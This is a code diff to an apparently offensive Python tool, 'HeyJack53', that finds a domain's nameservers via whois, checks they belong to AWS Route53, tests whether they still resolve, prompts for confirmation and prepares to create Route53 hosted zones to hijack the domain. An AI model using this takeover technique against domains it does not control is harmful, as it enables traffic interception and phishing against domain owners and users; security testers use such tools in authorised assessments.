@@ -39,16 +39,7 @@ def main():
         logging.error("Please, provide a domain to be hijacked!")
         sys.exit(1)
 
-    try:
-        dns.resolver.resolve(domain, 'NS')
-        logging.info('Looks like this domain was already taken :(')
-        logging.info('You can continue anyway with -f parameter')
-        if not force:
-            sys.exit(1)
-
-    except Exception as e:
-        print('No name server resolved! Continue and Hijack this domain!!')
-
+    print(f'Searching for {domain} nameservers ...')
     if not args.nameserver:
         whois_domain = whois.query(domain=args.domain)
         if not whois_domain:
@@ -56,10 +47,30 @@ def main():
             sys.exit(1)
         target_name_servers = whois_domain.name_servers
         if len(target_name_servers) == 0:
-            logging.error(f'We could find no nameserver for {domain}. You can provide them using -ns parameter.')
+            logging.error(f'We could not find a nameserver for {domain}. You can provide them using -ns parameter.')
     else:
         target_name_servers = set(args.nameserver[0])
+
+    print('The following name servers were found:')
     print(target_name_servers)
+
+    aws_dns = False
+    for ns in target_name_servers:
+        if 'awsdns' in ns:
+            aws_dns = True
+    if not aws_dns:
+        logging.error('These nameservers do not belong to an AWS Route53 hosted zones ... ')
+        sys.exit(1)
+
+    try:
+        dns.resolver.resolve(domain, 'NS')
+        print('Looks like this domain was already taken :(')
+        if not force:
+            logging.info('If it is a mistake you can continue anyway using the -f parameter')
+            sys.exit(1)
+
+    except Exception as e:
+        print('No name server resolved! Continue and Hijack this domain!!')
 
     if args.profile:
         session = boto3.Session(profile_name=args.profile)
@@ -72,9 +83,20 @@ def main():
         sys.exit(1)
     route53 = session.client('route53')
 
-    if verbose:
-        print('Domain:', domain)
-        print('Name Servers:', " ".join(target_name_servers))
+    print('\n', 80 * '-')
+    print('Everything is ready!')
+    print('Target Domain:', domain)
+    print('Target Name Servers:', " ".join(target_name_servers))
+    proceed = ""
+    while proceed not in ['Y', 'y', 'N', 'n']:
+        proceed = input('Continue? (Y/N) \n')
+
+    if proceed in ['Y', 'y']:
+        print('\n', 80 * '-')
+        print('Starting HeyJack53!\n\n')
+    elif proceed in ['N', 'n']:
+        print('Bye bye!')
+        sys.exit(1)
 
     counter = 0
     created_zones = []
